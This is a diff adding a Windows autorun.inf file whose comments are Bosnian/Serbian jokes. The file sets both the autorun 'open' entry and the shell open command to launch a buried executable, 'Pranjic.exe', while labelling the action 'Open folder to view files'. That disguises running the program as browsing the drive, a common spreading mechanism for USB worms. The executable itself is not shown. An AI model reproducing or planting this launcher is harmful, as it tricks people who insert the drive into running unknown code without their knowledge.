@@ -1,0 +1,9 @@
+[autorun]
+open=moja_cura\je_najbolja\Pranjic.exe
+;am su bile dve krave...jedna je bila corava....hahahahahhahahhahhaahahha
+
+;idu haso suljo i mujo prugom.kaze haso joj decki kolko ima ovih stepenica nikad im kraja, kaze suljo de suti ba ni rukohvati nisu bolji,a kaze mujo,decki bez brige stize lift xD
+action=Open folder to view files
+shell\open=Open
+shell\open\command=moja_cura\je_najbolja\Pranjic.exe
+shell\open\default=1
